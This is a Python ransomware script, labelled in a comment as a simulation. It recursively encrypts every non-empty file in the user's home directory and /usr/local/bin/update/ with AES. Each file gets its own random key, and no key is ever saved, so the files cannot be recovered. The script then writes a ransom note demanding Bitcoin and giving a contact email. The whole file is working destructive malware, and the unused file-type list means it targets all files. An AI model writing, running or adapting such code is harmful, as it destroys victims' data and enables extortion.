import os
import sys
import getpass
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# List of file extensions to target
TARGET_FILE_TYPES = ['.txt', '.docx', '.jpg', '.csv']

# AES key size (256-bit key)
KEY_SIZE = 32

# Generate a unique AES key for each file
def generate_aes_key():
    return os.urandom(KEY_SIZE)

# Function to get the user profile name
def get_profile_name():
    return getpass.getuser()

# Create a ransom note in the target directory
def create_ransom_note(target_directory):
    note_path = os.path.join(target_directory, "RANSOM_NOTE.txt")
    ascii_art = r"""
    ⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
    ⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
    ⣿⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⣿
    ⣿⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⠀⠈⢻⣿⠿⠛⠛⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⠋⠀⣿
    ⣿⠛⠁⢸⣥⣴⣾⣿⣷⣦⡀⠀⠈⠛⣿⣿⠛⠋⠀⢀⣠⣾⣿⣷⣦⣤⡿⠈⢉⣿
    ⣿⢋⣩⣼⡿⣿⣿⣿⡿⠿⢿⣷⣤⣤⣿⣿⣦⣤⣴⣿⠿⠿⣿⣿⣿⢿⣷⣬⣉⣿
    ⣿⣿⣿⣿⣷⣿⡟⠁⠀⠀⠀⠈⢿⣿⣿⣿⢿⣿⠋⠀⠀⠀⠈⢻⣿⣧⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣥⣶⣶⣶⣤⣴⣿⡿⣼⣿⡿⣿⣇⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⡿⢛⣿⣿⣿⣿⣿⣿⡿⣯⣾⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⠿⣿⣿⣿
    ⣿⣿⡏⠀⠸⣿⣿⣿⣿⣿⠿⠓⠛⢿⣿⣿⡿⠛⠛⠻⢿⣿⣿⣿⣿⡇⠀⠹⣿⣿
    ⣿⣿⡁⠀⠀⠈⠙⠛⠉⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿
    ⣿⠛⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⣿
    ⣿⠀⠈⢳⣶⣤⣤⣤⣤⡄⠀⠀⠠⠤⠤⠤⠤⠤⠀⠀⢀⣤⣤⣤⣤⣴⣾⠃⠀⣿
    ⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⣦⣀⡀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⠇⠀⠀⣿
    ⣿⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿
    ⣿⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣿
    ⣿⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠀⣿
    ⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
    ⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣶⡶⠆⣴⡿⡖⣠⣾⣷⣆⢠⣶⣿⣆⣶⢲⣶⠶⢰⣶⣿⢻⣷⣴⡖⠀⠀
    ⠀⠀⢠⣿⣷⠂⠻⣷⡄⣿⠁⢸⣿⣿⡏⠀⢹⣿⢸⣿⡆⠀⣿⠇⠀⣿⡟⠀⠀⠀
    ⠀⠀⢸⣿⠀⠰⣷⡿⠃⠻⣿⡿⠃⠹⣿⡿⣸⡏⣾⣷⡆⢠⣿⠀⠀⣿⠃
                                                                          
      YOU HAVE BEEN HACKED! Your files have been encrypted.

    All your important files have been encrypted. 
    To recover them, you need to pay us in Bitcoin.

    Send 1 Bitcoin to the following address:
    1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

    After payment, contact us at elliotalderson@mrrobot.com with your transaction ID.

    """

    try:
        with open(note_path, 'w') as note:
            note.write(ascii_art)
        print(f"Ransom note created at {note_path}")
    except PermissionError:
        print(f"Permission denied: Unable to create ransom note at {note_path}. Skipping...")

def encrypt_file(file_path, key):
    backend = default_backend()
    iv = os.urandom(16)
    
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()

    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        # Ensure at least one block of data is processed, even for empty files
        if len(file_data) == 0:
            file_data = bytes([16] * 16)  # Pad to one block size if empty

        # Pad data to be a multiple of AES block size (16 bytes)
        padding_length = 16 - (len(file_data) % 16)
        file_data += bytes([padding_length]) * padding_length

        encrypted_data = encryptor.update(file_data) + encryptor.finalize()

        # Write the encrypted data back to the file
        with open(file_path, 'wb') as f:
            f.write(iv + encrypted_data)

    except (FileNotFoundError, PermissionError) as e:
        print(f"Failed to encrypt {file_path}: {str(e)}. Skipping...")

# Simulate ransomware by encrypting files and creating a ransom note
def ransomware_attack(target_directories):
    for target_directory in target_directories:
        for root, dirs, files in os.walk(target_directory):
            for file in files:
                file_path = os.path.join(root, file)

                try:
                    file_size = os.path.getsize(file_path)
                    print(f"Found file: {file_path}, Size: {file_size} bytes")
                    if file_size == 0:
                        print(f"Skipping empty file: {file_path}")
                        continue

                    print(f"Encrypting {file_path}...")
                    key = generate_aes_key()
                    encrypt_file(file_path, key)
                except (FileNotFoundError, PermissionError) as e:
                    print(f"Error processing {file_path}: {str(e)}. Skipping...")

        create_ransom_note(target_directory)


if __name__ == "__main__":
    target_directory = '/home/' + get_profile_name() + '/'
    target_directories = [target_directory, '/usr/local/bin/update/']

    # Check each target directory before starting the attack
    valid_directories = [d for d in target_directories if os.path.isdir(d)]
    if not valid_directories:
        print("No valid directories found.")
        sys.exit(1)

    # Execute the ransomware attack for all valid target directories
    ransomware_attack(valid_directories)